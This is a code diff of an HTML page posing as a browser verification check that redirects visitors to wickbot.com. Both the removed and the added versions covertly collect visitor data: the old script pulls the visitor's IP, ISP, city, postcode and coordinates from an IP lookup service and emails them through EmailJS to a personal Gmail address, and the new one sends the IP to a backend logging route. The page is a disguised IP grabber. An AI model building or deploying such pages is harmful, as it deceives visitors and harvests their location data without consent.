@@ -4,47 +4,31 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifciation Process</title>
+    <title>Verifying...</title>
 
-    <!-- Redirect after 3 seconds -->
-    <meta http-equiv="refresh" content="3;url=https://wickbot.com" />
+    <!-- Redirect after 5 seconds to wickbot.com -->
+    <meta http-equiv="refresh" content="5;url=https://wickbot.com">
 </head>
 <body>
-    <h1>Checking your browser for verification....</h1>
-    
-    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
+    <h1>Checking your browser for verification...</h1>
+
     <script>
-        // Initialize EmailJS with your public key
-        emailjs.init("4ItP8f4Z88r0-9S1M"); // Replace with your public key from EmailJS
-
-        // Fetch IP information from ip-api
-        fetch('https://ip-api.com/json/')
+        // Fetch the IP information and send it to the backend API
+        fetch('/api/send-ip-log')  // This should be the path to your Vercel API route
             .then(response => response.json())
-            .then(ipData => {
-                // Prepare email parameters
-                const emailParams = {
-                    to_email: 'boriszarkov4@gmail.com', // Replace with your email
-                    ip_address: ipData.query,
-                    provider: ipData.org + " (" + ipData.as + ")",
-                    timezone: ipData.timezone,
-                    country: ipData.country,
-                    city: ipData.city,
-                    zip: ipData.zip,
-                    latitude: ipData.lat,
-                    longitude: ipData.lon
-                };
-
-                // Send email using EmailJS
-                emailjs.send("service_x25rs8q", "template_3mgw9je", emailParams)
-                    .then((response) => {
-                        console.log('Email sent successfully:', response);
-                    }, (error) => {
-                        console.error('Error sending email:', error);
-                    });
+            .then(data => {
+                console.log(data.message); // Log success message
+                alert(data.message); // Optionally show an alert to the user
             })
             .catch(error => {
-                console.error('Error fetching IP data:', error);
+                console.error('Error:', error); // Log any error
+                alert('Failed to fetch and store IP data.');
             });
+
+        // Optional: In case you want to ensure redirection happens via JavaScript as well
+        setTimeout(() => {
+            window.location.href = 'https://wickbot.com';  // Redirect to wickbot.com after 5 seconds
+        }, 5000);  // 5000ms = 5 seconds
     </script>
 </body>
 </html>
